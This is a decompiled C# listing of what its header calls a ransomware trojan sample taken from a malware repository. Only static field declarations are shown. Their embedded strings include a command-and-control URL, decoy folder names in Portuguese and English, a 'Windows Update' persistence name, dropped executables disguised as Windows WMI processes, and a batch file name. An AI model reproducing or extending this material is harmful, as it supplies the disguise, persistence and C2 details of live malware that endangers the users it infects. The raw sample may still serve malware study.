// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: VviXn, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5A785479-4E75-4C54-4742-516F6E567A62
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-38dcc3a61717ec01cae61ff2a65c12797565e8bd52b7b711414dd300a09944bc.exe

using \u003CCppImplementationDetails\u003E;
using \u003CCrtImplementationDetails\u003E;
using JARVIS;
using std;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

internal class \u003CModule\u003E
{
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_mp_z;
  [FixedAddressValueType]
  internal static int \u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FUninitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xi_vt_a;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedPerAppDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static bool \u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FIsDefaultDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_ma_a;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedNative\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static int \u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_ma_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedVtables\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xi_vt_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedPerProcess\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static bool \u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static bool \u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static bool \u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static int \u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA;
  internal static TriBool.State \u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A;
  internal static TriBool.State \u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A;
  internal static bool \u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_mp_a;
  public static unsafe int** __unep\u0040\u003FDoNothing\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z;
  public static unsafe int** __unep\u0040\u003F_UninitializeDefaultDomain\u0040LanguageSupport\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040GHFPNOJB\u0040bad\u003F5allocation\u003F\u0024AA\u0040;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4out_of_range\u0040std\u0040\u00406B\u0040;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_23 \u003F\u003F_R0\u003FAVout_of_range\u0040std\u0040\u0040\u00408;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02Q6AXXZ \u003F\u003F_7bad_alloc\u0040std\u0040\u00406B\u0040;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040exception\u0040std\u0040\u00408;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040logic_error\u0040std\u0040\u00408;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_20 \u003F\u003F_R0\u003FAVexception\u0040std\u0040\u0040\u00408;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_8 \u003F\u003F_R2bad_alloc\u0040std\u0040\u00408;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040bad_alloc\u0040std\u0040\u00408;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_12 \u003F\u003F_R2out_of_range\u0040std\u0040\u00408;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02Q6AXXZ \u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3bad_alloc\u0040std\u0040\u00408;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02Q6AXXZ \u003F\u003F_7out_of_range\u0040std\u0040\u00406B\u0040;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_20 \u003F\u003F_R0\u003FAVbad_alloc\u0040std\u0040\u0040\u00408;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4logic_error\u0040std\u0040\u00406B\u0040;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_4 \u003F\u003F_R2exception\u0040std\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3exception\u0040std\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3out_of_range\u0040std\u0040\u00408;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_8 \u003F\u003F_R2logic_error\u0040std\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3logic_error\u0040std\u0040\u00408;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_22 \u003F\u003F_R0\u003FAVlogic_error\u0040std\u0040\u0040\u00408;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4bad_alloc\u0040std\u0040\u00406B\u0040;
  internal static unsafe sbyte* std\u002E\u003FA0x9e79dd2a\u002E_bad_alloc_Message;
  internal static unsafe _Fac_node* std\u002E\u003FA0x9e79dd2a\u002E_Fac_head;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040out_of_range\u0040std\u0040\u00408;
  [FixedAddressValueType]
  internal static uint __exit_list_size_app_domain;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitbegin_app_domain;
  internal static uint \u003FA0x11773762\u002E__exit_list_size;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitend_app_domain;
  internal static unsafe __FnPtr<void ()>* \u003FA0x11773762\u002E__onexitbegin_m;
  internal static unsafe __FnPtr<void ()>* \u003FA0x11773762\u002E__onexitend_m;
  [FixedAddressValueType]
  internal static unsafe void* \u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA;
  [FixedAddressValueType]
  internal static int \u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003F\u003F_C\u0040_01NBENCBCI\u0040\u003F\u0024CK\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DF\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0DF\u0040NHDDFCKP\u0040abcdefghijklmnopqrstuvxzwyABCDEF\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CD\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CD\u0040BPKKHFJE\u0040atingiu\u003F5o\u003F5limite\u003F5de\u003F5threads\u003F5ativ\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040PCENNPGA\u0040\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003F\u003F_C\u0040_05CPJKMGFC\u0040Fotos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040DLJBJIAN\u0040Importante\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040GEMFLCBF\u0040Documentos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003F\u003F_C\u0040_08LCHFGBEB\u0040Arquivos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09HECLFCNM\u0040Registros\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09PCGBLHCJ\u0040Relatorio\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07OOKPOBEB\u0040Sistema\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040BNFNGMOL\u0040Dados\u003F5Trabalho\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040EPEGFDJP\u0040Wallpapers\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003F\u003F_C\u0040_05JPKIAOHJ\u0040Disco\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003F\u003F_C\u0040_05BEBFLIBD\u0040Erros\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BB\u0040LFILMENC\u0040PDFs\u003F5Importantes\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0O\u0040DNIHOJOC\u0040Mais\u003F5Arquivos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040DNABKGMA\u0040Para\u003F5Verificar\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040JMFPCLPB\u0040Minha\u003F5Conta\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040CKHKCMEB\u0040Meus\u003F5Dados\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BG\u0040OAKOPLJH\u0040Arquivos\u003F5e\u003F5Documentos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06DNBPDGPM\u0040Backup\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040ILLKBPFF\u0040importa\u003Fg\u003Fues\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0N\u0040LDEAMGGL\u0040configura\u003Fg\u003Fco\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06ECAOGEFD\u0040ativos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07CNDAOIPJ\u0040Objetos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06BNEHDFHO\u0040Photos\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09MCGAFAPH\u0040Important\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09IBGBKIMC\u0040Documents\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003F\u003F_C\u0040_05DIOAMJFE\u0040Files\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09KNBLANNJ\u0040Registers\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07NCMMNIJM\u0040Reports\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06JIODDOFH\u0040System\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003F\u003F_C\u0040_05NAOIJFC\u0040Error\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07DMAJFAJO\u0040actives\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040OBHDNIJO\u0040my\u003F5account\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07GPFJNOLD\u0040my\u003F5data\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BA\u0040DAHKIDJI\u0040important\u003F5files\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040NHEGCEPP\u0040more\u003F5files\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04MDPPAFID\u0040disk\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003F\u003F_C\u0040_08EEJLIFID\u0040my\u003F5works\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07PAINMLEO\u0040Objects\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07FDJHENA\u0040Desktop\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003F\u003F_C\u0040_08LEHIHMIJ\u0040pendrive\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04JLMDILM\u0040\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CB_W \u003F\u003F_C\u0040_13BBDEGPLJ\u0040\u003F\u0024AA\u003F\u0024CK\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CB_W \u003F\u003F_C\u0040_13JOFGPIOO\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CB_W \u003F\u003F_C\u0040_15DDHGOCBH\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F4\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003F\u003F_C\u0040_02HDBGODGB\u0040\u003F2\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03GCNDMCJL\u0040a\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03HAGGGNHF\u0040b\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03FFANDCKJ\u0040d\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03ONLBFFMM\u0040e\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03PPAEPKCC\u0040f\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03EHLIJNEH\u0040g\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03BPNLINBB\u0040h\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03KHGHOKHE\u0040i\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03LFNCEFJK\u0040j\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03NGOCCPP\u0040k\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03JALJBKEG\u0040l\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03CIAFHNCD\u0040m\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03DKLANCMN\u0040n\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03ICAMLFKI\u0040o\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03IKHGPCGB\u0040p\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03DCMKJFAE\u0040q\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03CAHPDKOK\u0040r\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03JIMDFNIP\u0040s\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03FBEGFDG\u0040t\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03LNKIACFD\u0040u\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03KPBNKNLN\u0040v\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03EPMCNKIO\u0040x\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03OFMLBCAF\u0040z\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03BHKBMKNI\u0040w\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03PHHOLNOL\u0040y\u003F3\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0EE\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0EE\u0040MLGEAKHK\u0040http\u003F3\u003F1\u003F1serverjarvis\u003F4sytes\u003F4net\u003F1re\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07NIMGFCME\u0040\u003F\u0024CGcache\u003F\u0024DN\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09MBDPDOGO\u0040\u003F\u0024CGiplocal\u003F\u0024DN\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CF\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CF\u0040PIBCDBKF\u0040\u003F26s4d5f65sd4f65sd4gg3216564_0022\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04ICMHLEIM\u0040\u003F\u0024CGnew\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040PJAKFCMN\u0040Windows\u003F5Update\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CB_W \u003F\u003F_C\u0040_1BE\u0040CGOLLDP\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F1\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AAr\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09OBIFGHAI\u0040\u003F4\u003F1tmp\u003F4err\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BD\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BD\u0040BPJMNAPG\u0040\u003F24564567453432\u003F4bat\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BE\u0040CFJGHNOO\u0040\u003F2win32_35465465\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BC\u0040GLBAHDJI\u0040\u003F2Windows\u003F5Objects\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07EMGJIMLB\u0040execute\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04HKOEJHNN\u0040unk2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1CE\u0040IPDBFFIC\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAi\u003F\u0024AAn\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAg\u003F\u0024AAr\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAo\u003F\u0024AAr\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BC\u0040GPFBCAPP\u0040wmiintegrator\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040KGNFHGGP\u0040nocreatefolder\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BO\u0040LOJMNGFO\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAh\u003F\u0024AAo\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAw\u003F\u0024AAi\u003F\u0024AAn\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0P\u0040OAFHBNOL\u0040wmihostwin\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BG\u0040DAOOLJHJ\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
